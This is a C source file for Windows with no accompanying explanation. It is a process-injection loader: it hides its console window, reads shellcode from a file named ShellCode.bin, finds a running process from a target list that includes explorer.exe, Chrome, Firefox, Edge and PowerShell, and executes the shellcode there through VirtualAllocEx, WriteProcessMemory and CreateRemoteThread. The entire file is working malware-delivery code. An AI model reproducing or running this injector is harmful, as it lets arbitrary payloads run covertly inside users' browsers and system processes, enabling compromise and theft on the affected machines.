// ===========================================================================================================================================================================================================================================

#include <windows.h>
#include <psapi.h>
#include <stdio.h>
#include <synchapi.h>
#include <tchar.h>

// Function to get the directory where the executable is located
void GetExecutablePath(wchar_t* buffer, DWORD size) {
    GetModuleFileNameW(NULL, buffer, size);
    for (DWORD i = size - 1; i > 0; --i) {
        if (buffer[i] == '\\' || buffer[i] == '/') {
            buffer[i + 1] = '\0';
            break;
        }
    }
}

// Function to load shellcode from a binary file
unsigned char* LoadShellcodeFromFile(const char* fileName, size_t* outSize) {
    FILE* file = NULL;
    errno_t err = fopen_s(&file, fileName, "rb");  

    if (err != 0 || file == NULL) {
        return NULL;
    }

    // Get the file size
    fseek(file, 0, SEEK_END);
    size_t fileSize = ftell(file);
    rewind(file);

    // Allocate memory for the shellcode
    unsigned char* shellcode = (unsigned char*)malloc(fileSize);
    if (shellcode == NULL) {
        fclose(file);
        return NULL;
    }

    // Read the file content into the buffer
    fread(shellcode, 1, fileSize, file);
    fclose(file);

    *outSize = fileSize;
    return shellcode;
}

int wmain() {
    // Hide the application window (if launched interactively)
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    // Target process names to inject into
    const WCHAR* targetProcNames[] = {
        L"explorer.exe",
        L"cmd.exe",
        L"powershell.exe",
        L"chrome.exe",
        L"firefox.exe",
        L"conhost.exe",
        L"RuntimeBroker.exe",
        L"UnikeyNT.exe",
        L"taskhostw.exe",
        L"msedge.exe"
    };

    // Variables
    DWORD adwProcesses[1024], dwReturnLen, dwPID;
    HANDLE hProcess = NULL, hThread = NULL;
    WCHAR szProcName[MAX_PATH];
    PVOID rBuffer = NULL;
    DWORD dwTID = NULL;
    HMODULE hModule = NULL;

    // Get the executable directory
    wchar_t exePath[MAX_PATH];
    GetExecutablePath(exePath, MAX_PATH);

    // Append the filename to the executable path
    wcscat_s(exePath, MAX_PATH, L"ShellCode.bin");

    // Convert the wide string path to a regular char* string for fopen
    char filePath[MAX_PATH];
    size_t convertedChars = 0;
    wcstombs_s(&convertedChars, filePath, MAX_PATH, exePath, _TRUNCATE); 

    // Load the shellcode from the .bin file in the same directory
    size_t shellcodeSize = 0;
    unsigned char* ShellCode = LoadShellcodeFromFile(filePath, &shellcodeSize);

    if (ShellCode == NULL) {
        return 1;
    }

    // Get the list of process identifiers
    if (!EnumProcesses(adwProcesses, sizeof(adwProcesses), &dwReturnLen)) {
        free(ShellCode);
        return 1;
    }

    // Calculate the number of process identifiers returned
    DWORD dwNmbrOfPids = dwReturnLen / sizeof(DWORD);

    // Loop through all processes
    for (DWORD i = 0; i < dwNmbrOfPids; i++) {
        if (adwProcesses[i] != 0) {

            // Open the process
            hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, FALSE, adwProcesses[i]);

            if (hProcess != NULL) {

                // Get the process name
                if (EnumProcessModules(hProcess, &hModule, sizeof(hModule), &dwReturnLen)) {
                    if (GetModuleBaseNameW(hProcess, hModule, szProcName, sizeof(szProcName) / sizeof(WCHAR))) {

                        // Compare the process name with the target process names
                        for (int j = 0; j < sizeof(targetProcNames) / sizeof(targetProcNames[0]); j++) {
                            if (wcscmp(szProcName, targetProcNames[j]) == 0) {
                               
                                // Allocate memory in the target process for the shellcode
                                rBuffer = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

                                if (rBuffer == NULL) {                              
                                    CloseHandle(hProcess);
                                    continue;
                                }

                                // Write the shellcode to the allocated memory
                                if (!WriteProcessMemory(hProcess, rBuffer, ShellCode, shellcodeSize, NULL)) {                                    
                                    VirtualFreeEx(hProcess, rBuffer, 0, MEM_RELEASE);
                                    CloseHandle(hProcess);
                                    continue;
                                }

                                // Create a remote thread to execute the shellcode
                                hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, &dwTID);
                                if (hThread == NULL) {
                                    VirtualFreeEx(hProcess, rBuffer, 0, MEM_RELEASE);
                                    CloseHandle(hProcess);
                                    continue;
                                }


                                // Wait for the remote thread to finish or the process to terminate
                                WaitForSingleObject(hThread, INFINITE);

                                // Clean up
                                CloseHandle(hThread);
                                VirtualFreeEx(hProcess, rBuffer, 0, MEM_RELEASE);
                                CloseHandle(hProcess);
                                free(ShellCode);

                                return 0;
                            }
                        }
                    }
                }

                // Close the handle to the process
                CloseHandle(hProcess);
            }
        }
    }
    free(ShellCode);
    return 1;
}
